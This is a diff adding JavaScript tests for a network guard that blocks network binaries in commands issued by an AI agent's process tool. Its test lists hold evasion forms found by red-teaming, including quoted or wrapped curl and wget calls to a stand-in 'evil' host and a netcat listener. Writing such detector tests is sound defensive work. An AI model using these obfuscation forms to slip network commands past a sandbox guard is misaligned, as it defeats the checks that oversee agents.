@@ -87,7 +87,103 @@ async function testSandboxWrapDegradedFlags() {
   assert.deepEqual(ok.argv, ['unshare', '-n', 'ls', '-la']);
 }
 
+async function testRawCommandScanBypasses() {
+  const { checkNetworkBinariesInRaw } = await import('../dist/security/network-guard.js');
+  // Red-team fix #5a: token-splitting missed quoted/parenthesized/absolute-path
+  // forms; the raw-string scan with word-boundary regexes must catch them.
+  for (const command of [
+    '"curl" https://example.com',
+    '(/usr/bin/curl) -s https://example.com',
+    'x=$(curl https://example.com)',
+    '/usr/bin/wget http://example.com',
+    'echo hi; nc -l 4444',
+    'sh -c "wget http://evil"',
+    'bash -c $\'curl http://evil\'',
+    'env curl https://example.com',
+  ]) {
+    const check = checkNetworkBinariesInRaw(command, 'none');
+    assert.equal(check.ok, false, `raw scan must block: ${command}`);
+    assert.ok(check.binary, 'blocked check must name the binary');
+  }
+  // Non-matching words must NOT false-positive.
+  for (const command of ['curlfoo --version', 'my-curl --help', 'curlx', 'ls -la /usr/bin']) {
+    const check = checkNetworkBinariesInRaw(command, 'none');
+    assert.equal(check.ok, true, `raw scan must not false-positive on: ${command}`);
+  }
+  // Profile other than 'none' is unrestricted.
+  assert.equal(checkNetworkBinariesInRaw('curl https://example.com', 'full').ok, true);
+}
+
+async function testDegradedSummaryAndSpawnEnvOverride() {
+  const { networkGuardSummary } = await import('../dist/security/network-guard.js');
+  // Red-team fix #5b: a 'none' profile without a usable sandbox must be
+  // reported degraded, never silently claimed enforced.
+  const summary = await networkGuardSummary('none');
+  assert.equal(summary.profile, 'none');
+  assert.equal(typeof summary.sandboxAvailable, 'boolean');
+  assert.equal(summary.degraded, summary.profile === 'none' && !summary.sandboxAvailable);
+
+  const full = await networkGuardSummary('full');
+  assert.equal(full.degraded, false, 'non-none profiles are never degraded');
+
+  // Red-team fix #5c: enforcement result carries a scrubbed spawn env override
+  // and the networkGuard summary when the profile is 'none'. ('ls -la' is an
+  // unmatched command, so the fail-closed classification needs the permissive
+  // opt-in to reach the network-guard pass here.)
+  const { preExecuteEnforcement } = await import('../dist/enforcement/pipeline.js');
+  const previousProfile = process.env.DC_NETWORK_PROFILE;
+  const previousUnmatched = process.env.DC_UNMATCHED_COMMAND_POLICY;
+  process.env.DC_NETWORK_PROFILE = 'none';
+  process.env.DC_UNMATCHED_COMMAND_POLICY = 'auto';
+  try {
+    const gate = await preExecuteEnforcement({
+      tool: 'start_process',
+      args: { command: 'ls -la' },
+      meta: { agent: 'test-agent' },
+    });
+    assert.equal(gate.allowed, true, 'ls must pass under network=none');
+    if (!gate.allowed) return;
+    assert.ok(gate.networkGuard, 'networkGuard summary must be attached for profile none');
+    assert.equal(gate.networkGuard.profile, 'none');
+    assert.equal(typeof gate.networkGuard.degraded, 'boolean');
+    assert.ok(gate.spawnEnvOverride, 'spawnEnvOverride must be exported for profile none');
+    process.env.HTTP_PROXY = 'http://leak:8080';
+    const scrubbed = await preExecuteEnforcement({
+      tool: 'start_process',
+      args: { command: 'ls -la' },
+      meta: { agent: 'test-agent' },
+    });
+    if (scrubbed.allowed) {
+      assert.ok(!('HTTP_PROXY' in (scrubbed.spawnEnvOverride ?? {})), 'spawnEnvOverride must scrub proxy vars');
+      assert.equal(scrubbed.spawnEnvOverride?.NO_PROXY, '*');
+    }
+    delete process.env.HTTP_PROXY;
+  } finally {
+    if (previousProfile === undefined) delete process.env.DC_NETWORK_PROFILE;
+    else process.env.DC_NETWORK_PROFILE = previousProfile;
+    if (previousUnmatched === undefined) delete process.env.DC_UNMATCHED_COMMAND_POLICY;
+    else process.env.DC_UNMATCHED_COMMAND_POLICY = previousUnmatched;
+  }
+
+  // profile !== 'none' => no networkGuard/spawnEnvOverride attached.
+  process.env.DC_NETWORK_PROFILE = 'full';
+  process.env.DC_UNMATCHED_COMMAND_POLICY = 'auto';
+  try {
+    const gate = await preExecuteEnforcement({
+      tool: 'start_process', args: { command: 'ls -la' }, meta: { agent: 'test-agent' },
+    });
+    if (gate.allowed) {
+      assert.equal(gate.networkGuard, undefined);
+      assert.equal(gate.spawnEnvOverride, undefined);
+    }
+  } finally {
+    delete process.env.DC_NETWORK_PROFILE;
+  }
+}
+
 await testEnvScrubbing();
 await testBlocklist();
+await testRawCommandScanBypasses();
 await testSandboxWrapDegradedFlags();
+await testDegradedSummaryAndSpawnEnvOverride();
 console.log('Network guard tests passed.');
